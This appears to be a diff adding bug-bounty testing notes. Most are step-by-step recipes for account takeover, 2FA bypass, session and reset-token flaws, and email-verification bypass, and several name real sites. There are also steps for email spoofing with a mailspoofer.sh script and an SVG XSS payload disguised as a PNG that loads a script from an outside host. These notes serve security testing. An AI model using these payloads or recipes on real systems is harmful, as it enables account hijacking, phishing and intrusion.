@@ -1,0 +1,330 @@
+=>> Hijacking accounts with host manipulation using collaborator
+------------------------------------------------------------------>
+
+1. Capture request of reset password
+2. Modify host as : host.com.burplink.net
+3. Forward request from repeater
+4. Reset link in inbox, Click on it . We’ll get reset token
+
+========================================================================================================================
+Session Doesn't expire after 2fa and also other session can change passsword
+
+## Steps To Reproduce:
+1. Login to the Same account in 2 different browser
+2. Now on 1st browser go to https://sidefx.com/profile and complete the all steps of 2fa and Enable it | 2FA activated
+3. Now go to another session or 2nd browser and reload the page.
+4. The account doesn't logout session is still alive.
+5. and now change the password on 2nd browser (which doesn't have 2fa enabled)
+BOOM!
+
+https://hackerone.com/reports/2234736
+-----------------------------------------------------------------------------
+🔥Email Verification Bypass (P3/P4)
+
+ 1)First You need to Create an account with Your Own Email Address.
+ 2)After Creating An Account A Verification Link will be sent to your account.
+ 3)Don't Use The Email Verification link. Change Your Email to Victim's Email.
+ 4)Now Go in Your Email and Click on Your Own Email Verification Link.
+ 5)if the Victim's Email Get Verified then This is a Bug.
+
+🔥Email Verification Bypass
+
+ 1)First You need to Create an account with Your Own Email Address.
+ 2)After Creating An Account A Verification Link will be sent to your account.
+ 3)than go to the change email section and change the attacker email 
+ 4)after this you receive a activation on attacker email do not open this 
+ 5)use step 2 use old activation link agaim click on this Now bhooom! attacker able to verify victim email using on activation link
+
+-------------------------------------------------------------------------------------------->
+2FA null
+-----
+Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_input.htm
+Enable 2FA
+
+Logout
+Login again and notice OTP is asked
+Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
+Before forwarding the request to server, remove the code and forward
+Turnoff Intercept and notice that your login request has been fulfilled
+
+---------------------------------------------------------------------------
+Password reset token leak via referrer
+---------------------------------------------------->
+1) Go To https://ucp.nordvpn.com/lost-password Page
+2) Enter Your Email And Click On Reset Password
+3) Go To Email & Click on Password Reset Link
+4) On Password Reset Page Click On Social Media Links Given Below And Capture The Request
+Using Burp Suite
+5) Check if the referer header is a leaking password reset token?
+==================================================================================================
+Auth miconfigure
+login with google 
+go my a/c > change email > confirm it > again try to login with google now boom > your login again on your same a/c
+
+-------------------------------------------------------------------------------------------------------------------------
+Step to repoduce:
+1. visit this url {https://www.pexels.com/}
+2. login with credential like Email & Password in browser "A"
+3. copy the session from login account 
+4. open your another browser "B" go to same website and don't loing here just past the session here
+5. your login in Browser "B" without using email ID & password 
+6. Now logout frome Browser "A"
+7. so now we are still login in browser "B" and we can any think in the victim account
+=======================================================================================================================
+ 
+
+=>> session highjacking improper senitization (register a/c, logout a/c, sent passwd reset link, don't us keep in inbox, login in a/c with old credential, and change email, after this click on reset link in same browser, boom it will work )
+
+
+==============================================================================================================================
+=>>ontains sensitive information
+------------------------------------>
+
+1. Enumerate email ID’s from register function (victim@gmail.com)
+2. Create account of yours (hacker@gmail.com) which you have access on gmail
+3. Login to site.com with hacker@gmail.com and update your email to victim@gmail.com
+4. You can say ATO also(hahahhaaha), malfunctioning part is its update everything to main email.
+5. Passwords on site.com for hacker and victim are qazwsx and qwerty respectively .
+6. Victim can log in using qwerty and qazwsx also (Misconfiguration)
+
+
+====================================================================================================================================
+=>> Steps to reproduce :
+---------------------->
+    Enable 2FA
+    Login with valid credentials
+    you will be redirected to 2FA page
+    Check its page source
+    BOOM :) User details disclosed here
+
+=====================================================================================================================================
+The DMARC record is not properly configured
+--------------------------------------------->
+
+
+https://bugcrowd.com/disclosures/d704c31e-96f7-4f41-83ed-739a92627421/the-dmarc-record-is-not-properly-configured
+
+Confirmation of vulnerability steps:
+First, open your Linux terminal, whether it's Kali or Parrot.
+Next, use the nslookup command with the following command: 'nslookup -type=txt _dmarc.odesli.co '
+Now you can see in there is not dmarc record found.
+Which means that email's domain is vulnerable for spoofing.
+
+Exploitation steps:
+Save the attached email spoofing script to your Linux system.
+Give command in kali or parrot : 'apt install postfix && apt install sendemail'
+Provide executable permission to the script by running the following command: chmod +x mailspoofer.sh
+Execute the script by using the following command, replacing receiver_email with the target recipient's email address: bash mailspoofer.sh receiver_email.
+After executing mailspoofer.sh, you will be prompted to enter the email address where you want to send the phishing email. Input the email address you wish to target.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+xss via svg file upload
+
+1. Save following code in .png extension
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/
+xlink" xml:space="preserve">
+ <!-- Script linked from the outside-->
+ <script xlink:href="https://yourserver.xss.ht"/>
+ <script>
+ //<![CDATA[
+ alert("ble");
+ ]]>
+ </script>
+ </svg>
+2. Save it as any.png
+3. Go to the live chat option and attach any.png
+4. Capture attach request and make any.png to any.png.svg 
+5. Right click on intercept > response to this request > intercept off
+
+
+
+EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+Bug type - Sever Security Misconfiguration -> Lack of security headers -> Cache control for a security page.
+Steps to Reproduce -
+1. Log in to the application
+2. Navigate around the pages
+3.
+Logout
+4.
+Press (Alt + left-arrow) buttons
+5. If you are logged in or can view the pages navigated by the user. Then give yourself a pat.
+You just found a bug.
+====================================================================================
+EXIF
+------>
+
+I was taking the image which is already containing GPSlocation.
+Steps to Reproduce:
+1. Open a web browser and go to https://app.withpersona.com/dashboard/login.
+2. Login with credential like (email & password)
+3. Upload profile picture
+4. Identify profile picture user-uploaded image available on the platform.
+Extract EXIF Data: 
+• Go to https://exifmeta.com/. 
+• Upload the downloaded image to the website. 
+• The website will automatically extract and display the EXIF geolocation data.
+
+
+------------------------------------------------------------------------------------------------------------
+overwrite account associated with email via android application
+------------------------------------------------------------------>
+
+Steps to reproduce:
+1) Create first account via Vine for android with the mail firstaccountmail@gmail.com with the password Bla123
+2) You can now see that you can login to the account created above.
+3) Go and create another account - this time with a different password and with the mail Firstaccountmail@gmail.com - notice the CAPS (you can put the caps everywhere on the mail).
+4) Finish the creation process - and see that it succeeds
+5) Now go back and try to login with firstaccountmail@gmail.com and the password Bla123 and see that you can't. However, it's possible to login with firstaccountmail@gmail.com and the second password you have created - but you"ll login to the second created account.
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Session Management Issues > Insecure Session Handling > P4 - Session Invalidated, Token Still Usable
+2. Log into the website.
+3. Capture any request, such as profile edit, using Burp Proxy.
+4. Logout from the website.
+5. Replay the captured request from step 2 and notice if it displays the proper response.
+
+Email Change and Password Reset Vulnerability
+1. Log in to the website.
+2. Change your email ID.
+3. Use the old email to reset the password.
+4. If you are able to reset the password using the old email, then there is a vulnerability.
+
+Insufficient account process validation leads to account takeover (P3/P4):
+1) Create an account on the website.
+2) Go to profile section. And Change & update your details in the name parameter and before saving it Open Burp suite, turn the proxy on and then click on Save.
+3) Now capture the request in Burp suite and send it to the Repeater tab.
+4) Now log out from the website and go back to the Burp suite.
+5) Now change the details email & name parameters and click on "Go" in the repeater tab.
+6) Now you will be able to see 200 ok response from the web server.
+7) Now, login into your account and go to the Profile section to confirm
+
+=======================================================================================================================================================================================
+1. Email Bounce Issues
+
+Check if Application has Invite Functionality
+Try sending Invites to Invalid Email Accounts
+Try to find Email Service Provider such as AWS SES , Hubspot , Campaign Monitor Note: You can find Email Service Provider by checking Email Headers
+Once you have the Email Service Provider, Check there Hard Bounce Limits. Here are the limits for some of them:
+
+1. Hubspot Hard bounces: HubSpot's hard bounce limit is 5%. For reference, many ISPs prefer bounce rates to be under 2%.
+
+2. AWS SES: The rate of SES ranges from first 2-5% then 5-10%
+
+Impact: Once the Hard Bounce Limits are reached, Email Service Provider will block the Company which means, No Emails would be sent to the Users !
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Session Hijacking (Intended Behavior)
+   
+    1.Create your account
+    2.Login your account
+    3.Use cookie editor extension in browser
+    4.Copy all the target cookies
+    5.Logout your account
+    6.Paste that cookies in cookie editor extension
+    7.Refresh page if you are logged in than this is a session hijacking
+
+============================================================================================================================
+P4 - Improper Access Control / Sensitive Data Exposure
+
+Steps to Reproduce:
+1. Create an account on site.com and confirm it through the welcome email.
+2. Log in and deactivate the account.
+3. Open the welcome email link in another browser.
+4. Click on the profile tab and observe that the email address is visible, even though the account is deactivated and not logged in.
+
+
+Steps to Reproduce:
+
+1. Create an account and confirm it.
+2. Request a password reset link.
+3. Deactivate the account.
+4. Use the old password reset link to reset the password.
+5. Log in with the new password.
+
+
+Steps to Reproduce:
+
+1. Log in to an account and navigate to a page with personal information.
+2. Log out from the account.
+3. Access the same page via the browser's cache/history.
+
+
+
+Steps to Reproduce:
+
+1. Log in to an account.
+2. Capture the session token.
+3. Log out from the account.
+4. Reuse the captured session token to access the account.
+
+
+Steps to Reproduce:
+
+1. Log in to an account and navigate to a page with personal information.
+2. Log out from the account.
+3. Access the same page via the browser's cache/history.
+
+
+Steps to Reproduce:
+1. Create an account on the website.
+2. Go to the profile section and update your details.
+3. Capture the request in Burp Suite and send it to the Repeater tab.
+4. Log out from the website.
+5. Go back to Burp Suite and modify the request.
+6. Observe the server response.
+7. Log back into your account and verify the changes.
+
+
+Sensitive Data Exposure > Via localStorage/sessionStorage > Sensitive Token (P4)
+
+teps to Reproduce:
+1. Create an account on the website.
+  * Sign up with your email and password, then log in.
+2. Inspect localStorage/sessionStorage:
+  * Open your browser’s developer tools (press F12 or right-click and select "Inspect").
+  * Go to the "Application" tab and check under "Local Storage" or "Session Storage."
+3. Find the sensitive token:
+  * Look for any sensitive tokens (like authentication tokens) stored there.
+4. Copy the token and log out:
+  * Copy the token value.
+  * Log out from the website.
+5. Capture a legitimate request in Burp Suite:
+  * Open Burp Suite and set your browser to use it as a proxy.
+  * Perform a legitimate action on the website that requires authentication and capture the request.
+6. Modify the request with the copied token:
+  * In Burp Suite, send the captured request to the Repeater tab.
+  * Replace the token in the request with the copied token.
+  * Click "Go" to send the modified request.
+7. Check the server response:
+  * Look at the server's response in Burp Suite. You should see a "200 OK" response, meaning the request was successful.
+8. Verify the unauthorized access:
+  * Log back into your account and confirm that the action from the modified request was executed, showing that the stolen token allowed unauthorized access.
+
+
+
+=================================================================================================================================================================================
+No Password Policy
+--------------------->>
+
+Go to the in scope target, create an account and see if you have any password policy enabled. Here are some common password lists. Below are top 100 common passwords-
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Insufficient Security Configurability > Weak Reset Password Implementation > Token Not Invalidated After Use
+
+Steps To Find This Bug:
+
+1. Go to https://target.com/ password reset page.
+2. Enter your email, and ask for a password reset link.
+3. Now go to mail and open that link in two tabs.
+4. Reset the password from one tab, reload the other tab , and if it let’s you reset password again then it is vulnerable to token not invalidated after use as we are resetting the password two times with same token.
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+STEPS TO REPRODUCE :
+
+- First set attacker website in first(http://evil.com)) name and last name and Update the profile
+- Logout
+- Click on Forgot-Password
+- BOOOM!!! You can see there is email recieved from website in which attacker website is mentioned in email and its clickable
